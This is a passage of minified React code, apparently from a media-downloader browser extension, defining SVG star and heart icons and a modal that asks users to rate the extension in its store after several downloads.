                    styleName: styleName,
                    border: border,
                    background: background,
                    color: color,
                    hoverBorder: hoverBorder,
                    hoverBackground: hoverBackground,
                    hoverBoxShadow: hoverBoxShadow,
                    hoverColor: hoverColor,
                    activeBorder: activeBorder,
                    activeBackground: activeBackground,
                    activeBoxShadow: activeBoxShadow,
                    activeColor: activeColor,
                },
                icon && react_default.a.createElement(icon),
                text && react_default.a.createElement(Text, null, text)
            );
        };
        var like = ({ style: style, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "22px", height: "22px", viewBox: "0 0 22 22", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: "#ff7e92",
                    d:
                        "M19.2,0.9H2.8c-0.8,0-1.6,0.4-2.1,1L0.4,3.7V14c0,1.6,0.8,2.8,2.4,2.8h3.8c0.3,0,0.6,0.5,0.8,0.7l3.3,3.3 l0.7,0.1c0,0,0.1-0.1,0.1-0.1l3.3-3.3c0.2-0.2,0.5-0.3,0.8-0.3h3.5c1.6,0,2.8-1.3,2.8-2.8V3.7C22,2.2,20.7,0.9,19.2,0.9z",
                }),
                react_default.a.createElement("path", {
                    fill: "#ff5f7a",
                    d: "M7.1,17.5l3.3,3.3c0.3,0.3,0.8,0.3,1.1,0.1L7.6,17c-0.3-0.3-0.8-0.5-1.3-0.5H2.8c-1.2,0-2.1-1-2.1-2.1V1.8 C0.3,2.3,0,3,0,3.7v10.6c0,1.6,1.3,2.8,2.8,2.8h3.5C6.6,17.2,6.9,17.3,7.1,17.5z",
                }),
                react_default.a.createElement("path", {
                    fill: "#ffffff",
                    d: "M16.7,7.6c-0.2-1.5-1.5-2.7-3-2.8c-0.9-0.1-1.8,0.3-2.4,0.9c-0.1,0.1-0.3,0.1-0.5,0c-0.6-0.6-1.5-0.9-2.4-0.9 C8,4.8,7.6,4.9,7.3,5.1c-1,0.4-1.7,2.6-1.7,2.6c-0.4,3.2,4,5.9,5.3,6.6l0.9,0C13.4,13.2,17,10.6,16.7,7.6z",
                }),
                react_default.a.createElement("path", { fill: "#ffd8de", d: "M6.1,7.2c0.1-0.9,0.5-1.6,1.2-2.1c-1,0.5-1.8,1.4-1.9,2.6c-0.4,3.2,4,6.1,5.3,6.9c0.2,0.1,0.5,0.1,0.7,0 c0.1-0.1,0.3-0.2,0.4-0.3C10.9,13.8,5.7,10.7,6.1,7.2z" })
            );
        var shining_star_outline = ({ style: style, color: color, color2: color2, className: className, onClick: onClick }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "83px", height: "86px", viewBox: "0 0 83 86", style: style, className: className, onClick: onClick },
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        "M44.6489 1.28087L44.6488 1.28097L44.658 1.28505C46.8002 2.23641 48.4365 4.18381 49.1497 6.4284L49.1507 6.43158C50.0338 9.14796 50.9058 11.86 51.778 14.5727C52.5665 17.0251 53.3552 19.4782 54.1525 21.9356C54.5045 23.1155 55.6311 24.0572 56.9371 24.0106C59.0616 24.0119 61.1859 24.0127 63.3101 24.0135C66.5021 24.0148 69.694 24.016 72.8861 24.019L72.8911 24.019C74.4923 24.0045 76.0911 24.3584 77.4423 25.1659L77.4423 25.166L77.4511 25.171C79.8428 26.5357 81.4115 29.1815 81.5974 31.9327L81.5977 31.9358C81.7526 34.031 81.0554 36.1795 79.7005 37.7826L79.7004 37.7826L79.6939 37.7906C79.1336 38.482 78.4257 39.0499 77.6671 39.6181C76.111 40.7524 74.5554 41.891 73.0004 43.0291C71.7457 43.9474 70.4914 44.8655 69.2374 45.7808L69.2318 45.785C68.4134 46.4002 67.2614 46.5339 66.3452 46.1034L66.3453 46.1033L66.3349 46.0987C65.2935 45.6377 64.5918 44.4961 64.6695 43.3651L64.67 43.3571L64.6703 43.349C64.7012 42.497 65.17 41.6764 65.8761 41.1617L65.8785 41.1599C67.334 40.0858 68.7949 39.0189 70.257 37.951L70.3394 37.8908C71.8269 36.8045 73.3155 35.7171 74.7989 34.6216C75.8141 33.9127 76.1641 32.5101 75.6827 31.4038C75.2618 30.3542 74.1654 29.6715 73.0441 29.7361C70.4444 29.7394 67.8451 29.7377 65.2451 29.7361C62.6416 29.7344 60.0374 29.7327 57.4328 29.736C56.4763 29.7242 55.569 29.6927 54.7135 29.4582L54.7135 29.4581L54.704 29.4557C52.2174 28.8261 50.0766 26.9712 49.0718 24.6083L49.0711 24.6064C48.7631 23.8901 48.5294 23.1565 48.2875 22.3969C48.194 22.1035 48.0993 21.8061 47.9986 21.5044C47.0728 18.6026 46.1378 15.7037 45.2032 12.806C44.7984 11.5509 44.3937 10.2961 43.9898 9.04141L43.9895 9.04038C43.9621 8.95581 43.9337 8.86269 43.9037 8.7643C43.8169 8.47935 43.7166 8.15011 43.5866 7.85568C43.4056 7.4459 43.1384 7.02597 42.6842 6.72905C41.9649 6.18785 41.0386 6.11256 40.2528 6.36133C39.4628 6.61143 38.7464 7.21154 38.4951 8.10054C37.691 10.5655 36.9037 13.0226 36.1168 15.4784C35.2397 18.2157 34.3631 20.9514 33.4645 23.6942C32.9417 25.2897 31.9997 26.7459 30.7109 27.7978L30.7109 27.7978L30.7056 27.8022C29.1829 29.0803 27.1841 29.7454 25.1849 29.7327L25.1806 29.7327C22.4958 29.7388 19.824 29.7368 17.1515 29.7348C14.6265 29.733 12.1008 29.7311 9.56305 29.7361V29.7359L9.5512 29.7362C9.50232 29.7375 9.45025 29.7382 9.39549 29.739C8.94029 29.7453 8.29952 29.7542 7.76108 30.0908C6.61762 30.7251 6.08608 32.2179 6.57124 33.4329C6.79441 34.1024 7.34193 34.5328 7.75389 34.8339L7.75405 34.834C11.1156 37.289 14.4727 39.7483 17.8302 42.2078C18.6712 42.8238 19.5122 43.4399 20.3534 44.0559C21.3518 44.7963 22.2475 45.639 22.8657 46.6631L22.8657 46.6632L22.8701 46.6703C24.1753 48.7522 24.4805 51.412 23.7265 53.7547L23.7259 53.7567C22.521 57.5549 21.2973 61.3472 20.0734 65.1401C19.6301 66.5138 19.1868 67.8877 18.7444 69.2618C18.4311 70.1174 18.477 1.1963 19.15 71.9727C19.984 73.089 21.7162 73.4195 22.8716 72.5325C25.4581 70.6424 28.0384 68.7413 30.6176 66.8411C31.7386 66.0153 32.8594 65.1896 33.9803 64.3651C34.2748 64.1528 34.5591 63.9401 34.8392 63.7306C35.5578 63.1931 36.2482 62.6767 37.0098 62.2424C39.1536 61.03 41.8538 60.8607 44.1443 61.7684L44.1443 61.7685L44.1544 61.7722C44.9396 62.064 45.6608 62.5268 46.3936 63.0396C48.3368 64.4434 50.2829 65.8549 52.2294 67.2666C54.3162 68.7801 56.4035 70.2939 58.4879 71.7988C58.5586 71.8499 58.6348 71.9069 58.7152 71.9671C58.9632 72.1527 59.2514 72.3684 59.5457 72.5341C59.949 72.7612 60.4313 72.9385 60.9931 72.8873C61.8609 72.8662 62.617 72.3862 63.0871 71.7383C63.5614 71.0847 63.7827 70.2072 63.4997 69.3615C62.8522 67.3901 62.188 65.4161 61.5245 63.444C60.9999 61.885 60.4758 60.3273 59.9606 58.7729L59.9607 58.7728L59.9576 58.7641C59.6079 57.771 59.8294 56.6027 60.542 55.8465L60.542 55.8465L60.5491 55.8387C61.3423 54.9606 62.73 54.6806 63.8026 55.1822L63.81 55.1856L63.8174 55.1888C64.5716 55.5122 65.1448 56.2117 65.4039 57.0302L65.4038 57.0302L65.4067 57.0386C65.6332 57.7124 65.8599 58.3859 66.0866 59.0595C67.0165 61.822 67.9459 64.5834 68.8624 67.3504C69.4705 69.2003 69.5154 71.2395 68.8313 73.0418L68.8312 73.0418L68.8283 73.0499C67.8655 75.7249 65.4346 77.8042 62.6568 78.4184L62.6519 78.4196C60.7265 78.8658 58.6409 78.5513 56.9039 77.598C56.1493 77.1726 55.4583 76.6695 54.7411 76.1474C54.4824 75.959 54.2203 75.7682 53.9506 75.5777C51.9947 74.1503 50.0277 72.7273 48.0617 71.305C46.3603 70.0741 44.6596 68.8437 42.9672 67.6113C42.3967 67.1867 41.6166 66.8044 40.7584 66.9337C40.2799 66.9897 39.8733 67.1836 39.5256 67.401C39.2928 67.5465 39.0567 67.7235 38.8459 67.8816C38.7548 67.9499 38.6684 68.0146 38.589 68.0718L38.5846 68.0751C34.9466 70.7573 31.307 73.4346 27.667 76.112L27.667 76.112L27.6606 76.1169C26.298 77.1535 24.9513 78.1221 23.3812 78.4959L23.3725 78.4979L23.3638 78.5003C20.7934 79.2107 17.9173 78.4917 15.8828 76.7605L15.8829 76.7604L15.8742 76.7533C13.8522 75.1097 12.6746 72.4693 12.8561 69.8712L12.8562 69.8712L12.8567 69.8614C12.9157 68.6853 13.2827 67.558 13.67 66.3682C13.7078 66.252 13.7459 66.1351 13.7838 66.0176L13.784 66.0171C14.2361 64.6124 14.6886 63.2075 15.1411 61.8026C16.1189 58.7671 17.0968 55.731 18.0716 52.6943C18.0718 52.6934 18.0721 52.6926 18.0724 52.6918L18.0769 52.6781C18.2804 52.0664 18.558 51.2315 18.3134 50.3932C18.1104 49.6191 17.542 49.0696 17.0095 48.6874C13.2008 45.903 9.3921 43.117 5.58686 40.3278C5.44612 40.2242 5.30608 40.1222 5.16716 40.0211C4.23971 39.3458 3.36224 38.7069 2.66023 37.8807L2.66029 37.8807L2.65469 37.8743C0.917045 35.8983 0.259183 33.0395 0.918984 30.4889L0.919119 30.489L0.921802 30.4775C1.48974 28.0471 3.18453 25.8924 5.44671 24.8481L5.44675 24.8481L5.45534 24.844C6.65972 24.2599 8.01902 24.0206 9.38656 24.019L9.38742 24.019C12.9307 24.0087 16.4734 24.0116 20.0171 24.0146C21.6832 24.0159 23.3496 24.0173 25.0164 24.0173C25.7102 24.0329 26.5233 23.8833 27.1314 23.3268C27.7831 22.7649 28.0421 21.9341 28.2406 21.2975C28.2615 21.2305 28.2817 21.1656 28.3017 21.1035L28.3017 21.1033C28.987 18.9643 29.6759 16.8242 30.3649 14.6837C31.22 12.0272 32.0753 9.36989 32.9244 6.71306C33.3377 5.42622 33.949 4.21407 34.8416 3.24453L34.8417 3.24459L34.8479 3.23763C36.3533 1.54028 38.602 0.576921 40.8834 0.5H41.3643C42.514 0.583957 43.6373 0.807018 44.6489 1.28087Z",
                }),
                react_default.a.createElement("path", {
                    fill: color2 || color,
                    d:
                        "M16.6264 7.46813L16.6264 7.46817L16.6329 7.4666C17.6752 7.21274 18.8402 7.61865 19.512 8.45877C19.9584 9.0171 20.3854 9.57941 20.8166 10.1472C21.0832 10.4984 21.3515 10.8516 21.6269 11.2073L21.6269 11.2073L21.6284 11.2092C22.0952 11.8062 22.369 12.5298 22.3164 13.2376L22.3157 13.2472L22.3154 13.2568C22.2757 14.3715 21.4932 15.4248 20.4382 15.7845L20.4313 15.7868L20.4244 15.7894C19.3263 16.2001 17.9806 15.8102 17.2519 14.8837L17.2519 14.8837L17.2492 14.8803C16.8022 14.322 16.3747 13.759 15.9425 13.1898C15.6779 12.8413 15.4115 12.4905 15.1378 12.137L15.1373 12.1364C14.6687 11.5332 14.3869 10.8155 14.443 10.1147L14.4441 10.102L14.4444 10.0892C14.4796 8.86833 15.4279 7.74316 16.6264 7.46813Z",
                }),
                react_default.a.createElement("path", {
                    fill: color2 || color,
                    d:
                        "M64.6584 7.47646L64.6712 7.47395L64.6839 7.47077C65.7803 7.19524 67.0243 7.67777 67.6625 8.61588L67.6624 8.61597L67.6701 8.62671C68.342 9.56036 68.3425 10.9288 67.6706 11.8648C67.1785 12.5423 66.6694 13.2017 66.155 13.868C65.9334 14.155 65.7108 14.4433 65.4882 14.7348L65.4882 14.7348L65.4844 14.7398C64.993 15.4004 64.246 15.8552 63.4521 15.9295L63.4421 15.9305L63.4322 15.9318C62.3998 16.0705 61.3106 15.5317 60.7467 14.64L60.7468 14.64L60.743 14.6342C60.1509 13.7261 60.1469 12.4689 60.7458 11.575C61.0844 11.0732 61.4415 10.6149 61.8101 10.1419C62.045 9.84035 62.2846 9.53285 62.5271 9.2043L62.5315 9.19836L62.5357 9.19231C63.1218 8.34694 63.7881 7.64753 64.6584 7.47646Z",
                }),
                react_default.a.createElement("path", {
                    fill: color2 || color,
                    d:
                        "M9.1035 52.7146L9.10339 52.7146L9.10959 52.7242C9.61976 53.5086 9.69969 54.5556 9.31215 55.4074L9.31203 55.4073L9.3075 55.4179C8.99412 56.151 8.32607 56.7223 7.54436 56.9868L7.54435 56.9867L7.53882 56.9887C7.25069 57.0899 6.96386 57.1915 6.67775 57.2929C5.85252 57.5851 5.03327 57.8753 4.20585 58.1494C2.88406 58.5805 1.28928 57.8557 0.73953 56.5805L0.739568 56.5805L0.736959 56.5746C0.298212 55.5917 0.479602 54.364 1.19027 53.5627L1.19686 53.5553L1.20314 53.5476C1.6916 52.9508 2.45793 52.6934 3.3518 52.3949C3.72626 52.2778 4.10085 52.1416 4.46252 52.0101C4.60186 51.9594 4.73929 51.9095 4.87405 51.8616C5.36653 51.6865 5.84197 51.5316 6.32524 51.4321C7.39124 51.2688 8.53599 51.797 9.1035 52.7146Z",
                }),
                react_default.a.createElement("path", {
                    fill: color2 || color,
                    d:
                        "M74.917 52.321L74.9261 52.319L74.935 52.3166C75.4253 52.1861 75.9225 52.2375 76.4623 52.3842C76.7328 52.4577 77.0055 52.5526 77.2898 52.656C77.3509 52.6782 77.413 52.701 77.4757 52.724C77.6946 52.8043 77.9217 52.8877 78.1459 52.9614C78.406 53.0611 78.6797 53.1532 78.9413 53.2412C79.0731 53.2856 79.2019 53.3289 79.3243 53.3717C79.7068 53.5052 80.0617 53.6439 80.3896 53.8238C81.4328 54.4164 82.0027 55.7415 81.7105 56.9034L81.708 56.9133L81.7059 56.9232C81.4692 58.0575 80.4067 58.9696 79.2397 59.0825L79.2232 59.0841L79.2068 59.0868C78.7908 59.1551 78.3721 59.0838 77.9091 58.9398C77.6798 58.8685 77.4506 58.7831 77.2069 58.6922L77.1977 58.6888C76.9612 58.6007 76.7104 58.5074 76.4561 58.4291C76.1741 58.3188 75.8615 58.216 75.566 58.1188C75.3822 58.0584 75.205 58.0001 75.0459 57.9435C74.5929 57.7825 74.1892 57.6064 73.8393 57.3535C72.9483 56.7004 72.5215 55.4683 72.8144 54.4013L72.8166 54.3932L72.8186 54.3849C73.0576 53.3821 73.9076 52.5499 74.917 52.321Z",
                }),
                react_default.a.createElement("path", {
                    fill: color2 || color,
                    d:
                        "M40.6913 76.2998L40.7 76.2986L40.7087 76.2972C41.8584 76.1015 43.0985 76.7128 43.6408 77.7436L43.6442 77.7501L43.6478 77.7564C43.8887 78.1837 43.9758 78.6685 43.9993 79.2212C44.011 79.4979 44.0067 79.7806 44.0013 80.078C44.001 80.0907 44.0008 80.1034 44.0006 80.1161C43.9955 80.3921 43.9902 80.6816 43.9997 80.9678C43.9933 81.2159 43.9971 81.4678 44.0007 81.7092C44.0012 81.7428 44.0017 81.7763 44.0021 81.8095C44.0061 82.0909 44.008 82.359 43.9943 82.6204C43.9668 83.1429 43.8781 83.6015 43.6475 84.005L43.6436 84.0118L43.64 84.0188C43.2053 84.838 42.3245 85.3877 41.3742 85.5H40.9201C39.9328 85.3909 39.019 84.7947 38.5953 83.9235L38.5917 83.9163L38.588 83.9092C38.4024 83.5568 38.323 83.1608 38.2935 82.7141C38.2738 82.416 38.2767 82.1323 38.2798 81.8311C38.2816 81.6608 38.2834 81.4849 38.2812 81.2976C38.2886 80.9548 38.2844 80.6321 38.2803 80.3199C38.2728 79.7459 38.2657 79.2076 38.3326 78.6457C38.4936 77.468 39.5115 76.4581 40.6913 76.2998Z",
                })
            );
        var star = ({ style: style, color: color, className: className, onClick: onClick }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "34px", height: "35px", viewBox: "0 0 34 35", style: style, className: className, onClick: onClick },
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        "M33.1,15.9c0.7-0.7,0.9-1.7,0.6-2.6c-0.3-0.9-1-1.6-2-1.7l-8.2-1.2c-0.3-0.1-0.6-0.3-0.8-0.6l-3.7-7.7 c-0.4-0.9-1.2-1.4-2.2-1.4c-0.9,0-1.8,0.5-2.2,1.4l-3.7,7.7c-0.2,0.3-0.5,0.6-0.8,0.6l-8.2,1.2c-0.9,0.1-1.7,0.8-2,1.7 c-0.3,0.9-0.1,1.9,0.6,2.6l5.9,6c0.3,0.3,0.4,0.6,0.3,1l-1.4,8.4c-0.1,0.7,0.1,1.5,0.5,2c0.7,0.9,2,1.2,3,0.6l7.3-4 c0.3-0.2,0.7-0.2,1,0l7.3,4c0.4,0.2,0.7,0.3,1.1,0.3c0.7,0,1.4-0.3,1.9-0.9c0.5-0.6,0.7-1.3,0.5-2l-1.4-8.4c-0.1-0.4,0.1-0.7,0.3-1 L33.1,15.9z",
                })
            );
        var shining_star = ({ style: style, color: color, className: className, onClick: onClick }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "49px", height: "47px", viewBox: "0 0 49 47", style: style, className: className, onClick: onClick },
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        "M40.7,17.9c0.7-0.7,0.9-1.7,0.6-2.6c-0.3-0.9-1-1.6-2-1.7l-8.2-1.2c-0.3-0.1-0.6-0.3-0.8-0.6l-3.7-7.7 c-0.4-0.9-1.2-1.4-2.2-1.4c-0.9,0-1.8,0.5-2.2,1.4l-3.7,7.7c-0.2,0.3-0.5,0.6-0.8,0.6l-8.2,1.2c-0.9,0.1-1.7,0.8-2,1.7 c-0.3,0.9-0.1,1.9,0.6,2.6l5.9,6c0.3,0.3,0.4,0.6,0.3,1l-1.4,8.4c-0.1,0.7,0.1,1.5,0.5,2c0.7,0.9,2,1.2,3,0.6l7.3-4 c0.3-0.2,0.7-0.2,1,0l7.3,4c0.4,0.2,0.7,0.3,1.1,0.3c0.7,0,1.4-0.3,1.9-0.9c0.5-0.6,0.7-1.3,0.5-2l-1.4-8.4c-0.1-0.4,0.1-0.7,0.3-1 L40.7,17.9z",
                }),
                react_default.a.createElement("path", { fill: color, d: "M24.6,46.8c-0.5,0-0.9-0.4-0.9-1v-7.8c0-0.5,0.4-1,0.9-1c0.5,0,0.9,0.4,0.9,1v7.8 C25.5,46.4,25.1,46.8,24.6,46.8z" }),
                react_default.a.createElement("path", { fill: color, d: "M47.7,29.8c-0.1,0-0.2,0-0.3,0l-7.3-2.4c-0.5-0.2-0.8-0.7-0.6-1.2c0.2-0.5,0.7-0.8,1.2-0.6l7.3,2.4 c0.5,0.2,0.8,0.7,0.6,1.2C48.5,29.5,48.1,29.8,47.7,29.8z" }),
                react_default.a.createElement("path", { fill: color, d: "M34.4,8.5c-0.2,0-0.4-0.1-0.6-0.2C33.4,8,33.3,7.4,33.6,7l4.5-6.3c0.3-0.4,0.9-0.5,1.3-0.2 c0.4,0.3,0.5,0.9,0.2,1.3l-4.5,6.3C34.9,8.4,34.7,8.5,34.4,8.5z" }),
                react_default.a.createElement("path", { fill: color, d: "M14.8,8.5c-0.3,0-0.6-0.1-0.8-0.4L9.5,1.8c-0.3-0.4-0.2-1,0.2-1.3c0.4-0.3,1-0.2,1.3,0.2L15.5,7 c0.3,0.4,0.2,1-0.2,1.3C15.2,8.5,15,8.5,14.8,8.5z" }),
                react_default.a.createElement("path", { fill: color, d: "M1.4,29.8c-0.4,0-0.8-0.3-0.9-0.7c-0.2-0.5,0.1-1,0.6-1.2l7.3-2.4c0.5-0.2,1,0.1,1.2,0.6c0.2,0.5-0.1,1-0.6,1.2 l-7.3,2.4C1.6,29.8,1.5,29.8,1.4,29.8z" })
            );
        const modal_Container = styled_components_browser_esm.a.div.withConfig({ displayName: "modal__Container", componentId: "sc-qiq7yr-0" })`${(props) =>
                "rtl" === props.dir ? `margin-right: ${props.scrollbarWidth};` : `margin-left: ${props.scrollbarWidth};`} position:absolute;top:0;right:0;bottom:0;left:0;display:flex;justify-content:center;align-items:center;`,
            modal_Modal = styled_components_browser_esm.a.div.withConfig({ displayName: "modal__Modal", componentId: "sc-qiq7yr-1" })`background-color:${(props) =>
                props.background || "white"};border-width:1px;border-style:solid;border-color:${(props) => props.border};border-radius:3px;padding:10px 7px;transition:opacity 0.25s ease-in-out;opacity:${(props) =>
                props.opacity};box-sizing:border-box;position:relative;font-family:Arial,Helvetica,sans-serif;font-weight:500;`,
            Overlay = styled_components_browser_esm.a.div.withConfig({
                displayName: "modal__Overlay",
                componentId: "sc-qiq7yr-2",
            })`background-color:rgba(0,0,0,0.75);position:absolute;border-radius:3px;top:-1px;right:-1px;bottom:-1px;left:-1px;display:${(props) => (props.theLast ? "none" : "block")};`;
        var modals_modal = (props) => {
            const { theLast: theLast, close: close, children: children } = props,
                { dir: dir, theme: theme, bodyScrollbarWidth: bodyScrollbarWidth } = use_app_state(["dir", "theme", "bodyScrollbarWidth"]),
                [isActive, setIsActive] = Object(react.useState)(!1),
                [opacity, setOpacity] = Object(react.useState)(0),
                modalNotificationStyles = theme && theme.modal_notification,
                background = modalNotificationStyles && modalNotificationStyles.background,
                border = modalNotificationStyles && modalNotificationStyles.border;
            return (
                Object(react.useEffect)(() => {
                    isActive ||
                        0 !== opacity ||
                        setTimeout(() => {
                            setOpacity(1);
                        }, 0);
                }, [isActive, opacity]),
                react_default.a.createElement(
                    modal_Container,
                    { dir: dir, scrollbarWidth: (bodyScrollbarWidth || 0) + "px" },
                    react_default.a.createElement(
                        modal_Modal,
                        {
                            opacity: opacity,
                            background: background,
                            border: border,
                            onTransitionEnd: () => {
                                isActive || setIsActive(!0);
                            },
                        },
                        children,
                        react_default.a.createElement(Overlay, { theLast: theLast })
                    )
                )
            );
        };
        const modal_asking_for_review_by_downloads_HeaderContainer = styled_components_browser_esm.a.div.withConfig({
                displayName: "modal-asking-for-review-by-downloads__HeaderContainer",
                componentId: "sc-11niuor-0",
            })`display:flex;flex-direction:row;align-items:center;justify-content:space-between;padding-bottom:8px;border-bottom:1px solid ${(props) => props.headerBorder};`,
            TitleContainer = styled_components_browser_esm.a.div.withConfig({
                displayName: "modal-asking-for-review-by-downloads__TitleContainer",
                componentId: "sc-11niuor-1",
            })`display:flex;align-items:center;flex-direction:row;&::after{content:" ";width:54px;}`,
            Title = styled_components_browser_esm.a.span.withConfig({ displayName: "modal-asking-for-review-by-downloads__Title", componentId: "sc-11niuor-2" })`font-size:16px;color:${(props) => props.color};${(props) =>
                "rtl" === props.dir ? "margin-right: 8px;" : "margin-left: 8px;"}`,
            modal_asking_for_review_by_downloads_ButtonClose = styled_components_browser_esm.a.button.withConfig({
                displayName: "modal-asking-for-review-by-downloads__ButtonClose",
                componentId: "sc-11niuor-3",
            })`background-color:transparent;outline:none;border:none;cursor:pointer;position:relative;width:21px;height:21px;box-sizing:border-box;&::before,&::after{content:" ";display:block;position:absolute;width:18px;height:1px;top:9px;left:1px;background-color:${(
                props
            ) => props.border || "black"};}&::before{transform:rotate(-45deg);}&::after{transform:rotate(45deg);}`,
            BodyContainer = styled_components_browser_esm.a.div.withConfig({ displayName: "modal-asking-for-review-by-downloads__BodyContainer", componentId: "sc-11niuor-4" })`display:flex;flex-direction:row;padding-top:9px;`,
            BodyColumn = styled_components_browser_esm.a.div.withConfig({ displayName: "modal-asking-for-review-by-downloads__BodyColumn", componentId: "sc-11niuor-5" })`min-width:390px;${(props) =>
                "rtl" === props.dir ? "margin-right: 10px;" : "margin-left: 10px;"}`,
            BodyText = styled_components_browser_esm.a.span.withConfig({ displayName: "modal-asking-for-review-by-downloads__BodyText", componentId: "sc-11niuor-6" })`font-size:17px;line-height:30px;color:${(props) =>
                props.color};& b{font-weight:bold;color:${(props) => props.color2};}`,
            StarsContainer = styled_components_browser_esm.a.div.withConfig({
                displayName: "modal-asking-for-review-by-downloads__StarsContainer",
                componentId: "sc-11niuor-7",
            })`display:flex;flex-direction:row;align-items:center;justify-content:center;padding:7px 0;& svg{&:not(:last-child){margin:0 9px;}&:last-child{transform:translateY(4px);margin:0 2px;}& path{fill:${(props) =>
                props.iconColor};}}`,
            FooterContainer = styled_components_browser_esm.a.div.withConfig({
                displayName: "modal-asking-for-review-by-downloads__FooterContainer",
                componentId: "sc-11niuor-8",
            })`display:flex;flex-direction:row;align-items:center;justify-content:space-between;padding-top:14px;& button{margin:0;&:first-child{padding:16px 28px;}&:last-child{padding:16px 60px;& span{font-weight:bold;}}}`,
            ButtonUnderline = styled_components_browser_esm.a.button.withConfig({
                displayName: "modal-asking-for-review-by-downloads__ButtonUnderline",
                componentId: "sc-11niuor-9",
            })`outline:none;border:none;padding:6px 8px;margin:0 auto 24px;display:block;cursor:pointer;font-size:16px;text-decoration:underline;background-color:transparent;color:${(props) => props.color};&:hover{color:${(props) =>
                props.hover};}`,
            modal_asking_for_review_by_downloads_Header = ({ close: close }) => {
                const { extensionName: extensionName } = config.a,
                    { t: t } = useTranslation(),
                    { dir: dir, theme: theme, setRatingModalLastNotNow: setRatingModalLastNotNow } = use_app_state(["dir", "theme", "setRatingModalLastNotNow"]),
                    modalNotificationStyles = theme && theme.modal_notification,
                    headerBorder = modalNotificationStyles && modalNotificationStyles.header_border,
                    titleColor = modalNotificationStyles && modalNotificationStyles.modal_title,
                    closeButtonBorder = modalNotificationStyles && modalNotificationStyles.close_button;
                return react_default.a.createElement(
                    modal_asking_for_review_by_downloads_HeaderContainer,
                    { headerBorder: headerBorder },
                    react_default.a.createElement(
                        TitleContainer,
                        null,
                        react_default.a.createElement(like, null),
                        react_default.a.createElement(Title, { dir: dir, color: titleColor }, t("social_media_sharing.help_extension_to_get_better", { extensionName: extensionName }))
                    ),
                    react_default.a.createElement(modal_asking_for_review_by_downloads_ButtonClose, {
                        onClick: () => {
                            setRatingModalLastNotNow(Date.now()), close();
                        },
                        border: closeButtonBorder,
                    })
                );
            },
            Body = ({ close: close }) => {
                const { dir: dir, theme: theme, downloadsCount: downloadsCount, eventRouter: eventRouter } = use_app_state(["dir", "theme", "downloadsCount", "eventRouter"]),
                    { t: t } = useTranslation(),
                    modalNotificationStyles = theme && theme.modal_notification,
                    iconColor = modalNotificationStyles && modalNotificationStyles.modal_icon_color,
                    iconColor2 = modalNotificationStyles && modalNotificationStyles.modal_icon_color2,
                    iconColor3 = modalNotificationStyles && modalNotificationStyles.modal_icon_color3,
                    bodyColor = modalNotificationStyles && modalNotificationStyles.modal_body,
                    bodyColor2 = modalNotificationStyles && modalNotificationStyles.modal_body2,
                    redirectToStore = () => {
                        console.log("We was rated!!!", config.a), window.open(config.a.ratingUrl, "_blank").focus(), eventRouter.emit("userRedirectedToStore", "askingForReviewByDownloads"), close();
                    };
                return react_default.a.createElement(
                    BodyContainer,
                    null,
                    react_default.a.createElement(shining_star_outline, { color: iconColor, color2: iconColor2, style: { margin: "10px 8px" } }),
                    react_default.a.createElement(
                        BodyColumn,
                        { dir: dir },
                        react_default.a.createElement(
                            BodyText,
                            { color: bodyColor, color2: bodyColor2 },
                            react_default.a.createElement(
                                Trans,
                                { i18nKey: "social_media_sharing.asking_for_review_by_downloads", count: downloadsCount, values: { downloadsCount: downloadsCount } },
                                "You've successfully downloaded ",
                                downloadsCount,
                                " ",
                                t("social_media_sharing.mediafile"),
                                ".",
                                react_default.a.createElement("br", null),
                                "We would be grateful for the review and ",
                                react_default.a.createElement("b", null, "5 stars"),
                                " ;)",
                                react_default.a.createElement("br", null),
                                "It's really important for development."
                            )
                        ),
                        react_default.a.createElement(
                            StarsContainer,
                            { iconColor: iconColor3 },
                            react_default.a.createElement(star, { onClick: redirectToStore }),
                            react_default.a.createElement(star, { onClick: redirectToStore }),
                            react_default.a.createElement(star, { onClick: redirectToStore }),
                            react_default.a.createElement(star, { onClick: redirectToStore }),
                            react_default.a.createElement(shining_star, { onClick: redirectToStore })
                        )
                    )
                );
            },
            Footer = ({ close: close }) => {
                const { theme: theme, setRatingModalLastNotNow: setRatingModalLastNotNow, eventRouter: eventRouter } = use_app_state(["theme", "setRatingModalLastNotNow", "eventRouter"]),
                    { t: t } = useTranslation(),
                    modalNotificationStyles = theme && theme.modal_notification,
                    buttonUnderline = modalNotificationStyles && modalNotificationStyles.button_underline,
                    color = buttonUnderline && buttonUnderline.color,
                    hover = buttonUnderline && buttonUnderline.hover;
                return react_default.a.createElement(
                    FooterContainer,
                    null,
                    react_default.a.createElement(
                        ButtonUnderline,
                        {
                            color: color,
                            hover: hover,
                            onClick: () => {
                                setRatingModalLastNotNow(Date.now()), close();
                            },
                        },
                        t("social_media_sharing.button_cancel_rate")
                    ),
                    react_default.a.createElement(ui_button, {
                        onClick: () => {
                            console.log("We was rated!!!", config.a), window.open(config.a.ratingUrl, "_blank").focus(), eventRouter.emit("userRedirectedToStore", "askingForReviewByDownloads"), close();
                        },
                        text: t("social_media_sharing.button_rate"),
                    })
                );
            };
        const modal_asking_for_review_by_screenshots_HeaderContainer = styled_components_browser_esm.a.div.withConfig({
                displayName: "modal-asking-for-review-by-screenshots__HeaderContainer",
                componentId: "sc-kop4qa-0",
            })`display:flex;flex-direction:row;align-items:center;justify-content:space-between;padding-bottom:8px;border-bottom:1px solid ${(props) => props.headerBorder};`,
            modal_asking_for_review_by_screenshots_TitleContainer = styled_components_browser_esm.a.div.withConfig({
                displayName: "modal-asking-for-review-by-screenshots__TitleContainer",
                componentId: "sc-kop4qa-1",
            })`display:flex;align-items:center;flex-direction:row;&::after{content:" ";width:54px;}`,
            modal_asking_for_review_by_screenshots_Title = styled_components_browser_esm.a.span.withConfig({ displayName: "modal-asking-for-review-by-screenshots__Title", componentId: "sc-kop4qa-2" })`font-size:16px;color:${(props) =>
                props.color};${(props) => ("rtl" === props.dir ? "margin-right: 8px;" : "margin-left: 8px;")}`,
